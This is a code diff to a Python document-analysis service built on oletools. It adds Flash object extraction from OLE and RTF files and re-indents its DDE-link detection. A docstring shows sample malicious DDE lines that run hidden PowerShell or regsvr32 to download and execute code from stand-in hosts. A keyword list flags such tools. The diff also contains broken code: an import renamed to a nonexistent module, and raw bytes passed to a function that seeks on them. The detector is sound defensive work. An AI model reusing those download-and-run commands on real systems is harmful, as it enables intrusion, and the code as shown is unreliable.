@@ -92,9 +92,11 @@ class Oletools(ServiceBase):
     def import_service_deps(self):
         from oletools.olevba import VBA_Parser, VBA_Scanner
         from oletools.oleid import OleID, Indicator
+        from oletools.thirdparty import xxxswf
         from oletools.thirdparty.olefile import olefile
         from oletools.rtfobj import rtf_iter_objects
-        from oletools import msodde
+        from oletools import msodd
+        from io import BytesIO
         import magic
         try:
             from al_services.alsvc_frankenstrings.balbuzard.patterns import PatternMatch
@@ -102,9 +104,10 @@ class Oletools(ServiceBase):
         except ImportError:
             pass
         global VBA_Parser, VBA_Scanner
-        global OleID, Indicator, olefile, rtf_iter_objects
+        global OleID, Indicator, olefile, rtf_iter_objects, xxxswf
         global msodde
         global magic
+        global BytesIO
 
     def start(self):
         self.log.debug("Service started")
@@ -516,6 +519,25 @@ class Oletools(ServiceBase):
         if xml_b64_res.score > 0:
             self.ole_result.add_section(xml_b64_res)
 
+    def extract_swf_objects(self, f):
+        # Taken from oletools.thirdpart.xxpyswf disneyland module
+        # def disneyland(f, filename, options):
+        retfindSWF =  xxxswf.findSWF(f)
+        f.seek(0)
+        # for each SWF in file
+        for idx, x in enumerate(retfindSWF):
+            f.seek(x)
+            h = f.read(1)
+            f.seek(x)
+            swf = xxxswf.verifySWF(f, x)
+            if swf == None:
+                continue
+            swf_md5 = hashlib.sha256(swf).hexdigest()
+            swf_path = os.path.join(self.working_directory, '{}.swf'.format(swf_md5))
+            with open(swf_path, 'wb') as fh:
+                fh.write(swf)
+            self.request.add_extracted(swf_path, text="Flash file extracted during sample analysis")
+
     # chains.json contains common English trigraphs. We score macros on how common these trigraphs appear in code,
     # skipping over some common keywords. A lower score indicates more randomized text, random variable/function names
     # are common in malicious macros.
@@ -597,82 +619,82 @@ class Oletools(ServiceBase):
             section = ResultSection(SCORE.NULL, "OleVBA : Error parsing macros: {}".format(e))
             self.ole_result.add_section(section)
 
-        def check_for_dde_links(self, filepath):
-            # noinspection PyBroadException
-            try:
-                # TODO -- undetermined if other fields could be misused.. maybe do 2 passes, 1 filtered & 1 not
-                links_text = msodde.process_file(filepath=filepath, field_filter_mode=msodde.FIELD_FILTER_DDE)
+    def check_for_dde_links(self, filepath):
+        # noinspection PyBroadException
+        try:
+            # TODO -- undetermined if other fields could be misused.. maybe do 2 passes, 1 filtered & 1 not
+            links_text = msodde.process_file(filepath=filepath, field_filter_mode=msodde.FIELD_FILTER_DDE)
 
-                links_text = links_text.strip()
-                if not links_text:
-                    return
-                self.process_dde_links(links_text, self.ole_result)
+            links_text = links_text.strip()
+            if not links_text:
+                return
+            self.process_dde_links(links_text, self.ole_result)
 
-            except Exception as exc:
-                self.log.warn("msodde parsing failed: {}".format(str(exc)))
-                section = ResultSection(SCORE.NULL, "msodde : Error parsing document")
-                self.ole_result.add_section(section)
+        except Exception as exc:
+            self.log.warn("msodde parsing failed: {}".format(str(exc)))
+            section = ResultSection(SCORE.NULL, "msodde : Error parsing document")
+            self.ole_result.add_section(section)
 
-        def process_dde_links(self, links_text, ole_section):
-            ddeout_name = '{}.ddelinks.original'.format(self.request.sha256)
-            ddeout_path = os.path.join(self.working_directory, ddeout_name)
-            with open(ddeout_path, 'w') as fh:
-                fh.write(links_text)
-            self.request.add_extracted(name=ddeout_path, text=ddeout_name, display_name="Original DDE Links")
+    def process_dde_links(self, links_text, ole_section):
+        ddeout_name = '{}.ddelinks.original'.format(self.request.sha256)
+        ddeout_path = os.path.join(self.working_directory, ddeout_name)
+        with open(ddeout_path, 'w') as fh:
+            fh.write(links_text)
+        self.request.add_extracted(name=ddeout_path, text=ddeout_name, display_name="Original DDE Links")
 
-            """ typical results look like this:
-            DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
-            \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
-            ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx" 
-            DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden 
-            $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell 
-            -Command $e"
-            DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe" 
-            "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons" 
-            """
+        """ typical results look like this:
+        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\WindowsPowerShell
+        \\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden -C $e=(new-object system.net.webclient).downloadstring
+        ('http://bad.ly/Short');powershell.exe -e $e # " "Legit.docx" 
+        DDEAUTO c:\\Windows\\System32\\cmd.exe "/k powershell.exe -NoP -sta -NonI -W Hidden 
+        $e=(New-Object System.Net.WebClient).DownloadString('http://203.0.113.111/payroll.ps1');powershell 
+        -Command $e"
+        DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\windows\\system32\\cmd.exe" 
+        "/c regsvr32 /u /n /s /i:\"h\"t\"t\"p://downloads.bad.com/file scrobj.dll" "For Security Reasons" 
+        """
 
-            # to date haven't seen a sample with multiple links yet but it should be possible..
-            dde_section = ResultSection(SCORE.MED, "MSO DDE Links:", body_format=TEXT_FORMAT.MEMORY_DUMP)
-            dde_extracted = False
-            looksbad = False
+        # to date haven't seen a sample with multiple links yet but it should be possible..
+        dde_section = ResultSection(SCORE.MED, "MSO DDE Links:", body_format=TEXT_FORMAT.MEMORY_DUMP)
+        dde_extracted = False
+        looksbad = False
 
-            suspicious_keywords = (
-            'powershell.exe', 'cmd.exe', 'webclient', 'downloadstring', 'mshta.exe', 'scrobj.dll',
-            'bitstransfer', 'cscript.exe', 'wscript.exe')
-            for line in links_text.splitlines():
-                if ' ' in line:
-                    (link_type, link_text) = line.strip().split(' ', 1)
+        suspicious_keywords = (
+        'powershell.exe', 'cmd.exe', 'webclient', 'downloadstring', 'mshta.exe', 'scrobj.dll',
+        'bitstransfer', 'cscript.exe', 'wscript.exe')
+        for line in links_text.splitlines():
+            if ' ' in line:
+                (link_type, link_text) = line.strip().split(' ', 1)
 
-                    # do some cleanup here to aid visual inspection
-                    link_type = link_type.strip()
-                    link_text = link_text.strip()
-                    link_text = link_text.replace(u'\\\\', u'\u005c')  # a literal backslash
-                    link_text = link_text.replace(u'\\"', u'"')
-                    dde_section.add_line("Type: %s" % link_type)
-                    dde_section.add_line("Text: %s" % link_text)
-                    dde_section.add_line("\n\n")
-                    dde_extracted = True
-                    tag_weight = TAG_WEIGHT.HIGH
+                # do some cleanup here to aid visual inspection
+                link_type = link_type.strip()
+                link_text = link_text.strip()
+                link_text = link_text.replace(u'\\\\', u'\u005c')  # a literal backslash
+                link_text = link_text.replace(u'\\"', u'"')
+                dde_section.add_line("Type: %s" % link_type)
+                dde_section.add_line("Text: %s" % link_text)
+                dde_section.add_line("\n\n")
+                dde_extracted = True
+                tag_weight = TAG_WEIGHT.HIGH
 
-                    ddeout_name = '{}.ddelinks'.format(hashlib.sha256(link_text).hexdigest())
-                    ddeout_path = os.path.join(self.working_directory, ddeout_name)
-                    with open(ddeout_path, 'w') as fh:
-                        fh.write(link_text)
-                    self.request.add_extracted(name=ddeout_path, text=ddeout_name, display_name="Tweaked DDE Link")
+                ddeout_name = '{}.ddelinks'.format(hashlib.sha256(link_text).hexdigest())
+                ddeout_path = os.path.join(self.working_directory, ddeout_name)
+                with open(ddeout_path, 'w') as fh:
+                    fh.write(link_text)
+                self.request.add_extracted(name=ddeout_path, text=ddeout_name, display_name="Tweaked DDE Link")
 
-                    link_text_lower = link_text.lower()
-                    if any(x in link_text_lower for x in suspicious_keywords):
-                        looksbad = True
-                        tag_weight = TAG_WEIGHT.SURE
+                link_text_lower = link_text.lower()
+                if any(x in link_text_lower for x in suspicious_keywords):
+                    looksbad = True
+                    tag_weight = TAG_WEIGHT.SURE
 
-                    ole_section.add_tag(TAG_TYPE.OLE_DDE_LINK,
-                                        value=link_text,
-                                        weight=tag_weight,
-                                        usage=TAG_USAGE.CORRELATION)
-            if dde_extracted:
-                if looksbad:
-                    dde_section.change_score(SCORE.SURE)
-                ole_section.add_section(dde_section)
+                ole_section.add_tag(TAG_TYPE.OLE_DDE_LINK,
+                                    value=link_text,
+                                    weight=tag_weight,
+                                    usage=TAG_USAGE.CORRELATION)
+        if dde_extracted:
+            if looksbad:
+                dde_section.change_score(SCORE.SURE)
+            ole_section.add_section(dde_section)
 
     def check_for_macros(self, filename, file_contents, request_hash):
         # noinspection PyBroadException
@@ -1119,6 +1141,16 @@ class Oletools(ServiceBase):
                 is_ole = True
                 oles[file_name] = olefile.OleFileIO(file_name)
 
+            # Find flash objects in OLE
+            if is_ole:
+                for direntry in oles[file_name]:
+                    if direntry is not None and direntry.entry_type == olefile.STGTY_STREAM:
+                        f = oles[file_name]._open(direntry.isectStart, direntry.size)
+                        # check if data contains the SWF magic: FWS or CWS
+                        thedata = f.getvalue()
+                        if b'FWS' in thedata or b'CWS' in thedata:
+                            self.extract_swf_objects(thedata)
+
             decompressed_macros = False
             for ole_filename in oles.iterkeys():
                 try:
@@ -1137,6 +1169,10 @@ class Oletools(ServiceBase):
                 self.request.add_extracted(extracted_obj,
                                            'Embedded RTF Object at offset %s' % hex(offset),
                                            rtfobject_name)
+                # Find flash objects in RTF
+                if b'FWS' in rtfobject or b'CWS' in rtfobject:
+                    f = BytesIO(rtfobject)
+                    self.extract_swf_objects(f)
 
             if len(streams_res.body) > 0:
                 self.ole_result.add_section(streams_res)
